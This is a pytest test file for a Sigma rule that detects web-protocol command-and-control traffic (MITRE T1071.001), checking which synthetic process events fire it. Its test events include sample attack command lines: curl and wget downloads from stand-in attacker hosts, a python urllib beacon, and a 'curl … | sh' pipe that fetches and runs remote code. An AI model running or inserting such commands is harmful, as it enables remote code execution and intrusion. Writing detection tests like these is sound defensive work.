"""Tests for the T1071.001 Web Protocols C2 Sigma rule.

Lives in server/rules/builtin/mitre_attack/T1071_application_layer_protocol.yml
and is exercised end-to-end through SigmaRuleRunner.

Covers:
- curl http://203.0.113.10/x.sh                     → fires
- wget https://attacker.example/beacon              → fires
- python -c 'import urllib; ...'                    → fires
- bash -c 'curl ...'                                → fires
- nc / wget via apt-get install (filter_legit)      → does NOT fire
- apt-get install with curl in command              → does NOT fire (pkg filter)
- chromium command line with https://                → does NOT fire (browser)
- random unrelated process                          → does NOT fire
- substring trap: /usr/local/plist is not a filter keyword
  → no false positive from keyword substring
"""
from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest

from tests.fake_redis import FakeRedis
from zaqorincore_server.detectors.base import ParsedEvent
from zaqorincore_server.rule_engine.runner import SigmaRuleRunner
from zaqorincore_server.rule_engine.sigma import load_rules_from_dir

RULE_ID = "9f3a4b21-7c8e-4d1a-b6f5-2a8c4e9d0b73"


def _rules() -> list:
    return load_rules_from_dir(Path("rules/builtin/mitre_attack"))


def _find(rules: list):
    return next(r for r in rules if r.id == RULE_ID)


def _event(process: str, command: str, **md) -> ParsedEvent:
    meta = {
        "event_type": "process_create",
        "process": process,
        "command": command,
        "user": "alice",
    }
    meta.update(md)
    return ParsedEvent(
        event_id=uuid.uuid4(),
        host_id=uuid.uuid4(),
        source="linux.audit.execve",
        raw="",
        metadata=meta,
        occurred_at=datetime.now(timezone.utc),
    )


@pytest.mark.asyncio
async def test_curl_http_outbound_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/curl", "curl http://203.0.113.10/x.sh -o /tmp/x.sh")
    )
    assert len(fires) == 1
    assert fires[0].rule.id == RULE_ID


@pytest.mark.asyncio
async def test_wget_https_beacon_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/usr/bin/wget", "wget https://attacker.example/beacon")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_python_urllib_c2_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/python3",
            "python3 -c 'import urllib.request; urllib.request.urlopen(\"https://evil.example/c2\")'",
        )
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_bash_sh_c_curl_fires() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/bash", "bash -c 'curl -s https://evil.example/r|sh'")
    )
    assert len(fires) == 1


@pytest.mark.asyncio
async def test_apt_install_with_curl_in_command_does_not_fire() -> None:
    """apt-get process excluded via filter_legit even though 'curl' appears in command."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/apt-get",
            "apt-get install -y curl wget",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_browser_chromium_with_https_does_not_fire() -> None:
    """Chromium process excluded via filter_legit — legitimate browser traffic."""
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event(
            "/usr/bin/chromium",
            "chromium --no-sandbox https://news.example.com",
        )
    )
    assert fires == []


@pytest.mark.asyncio
async def test_unrelated_process_does_not_fire() -> None:
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls -la /var/log/")
    )
    assert fires == []


@pytest.mark.asyncio
async def test_substring_trap_path_does_not_match() -> None:
    """Anti-substring safety: a command containing 'plist' as substring
    (which is a T1546.005/T1547 filter keyword in other rules, NOT here)
    must NOT spuriously match. Verify rule does not depend on substring
    matches to filter_legit keywords. Path '/usr/local/plist' has no http.
    """
    runner = SigmaRuleRunner(FakeRedis(), [_find(_rules())])
    fires = await runner.evaluate(
        _event("/bin/ls", "ls /usr/local/plist")
    )
    assert fires == []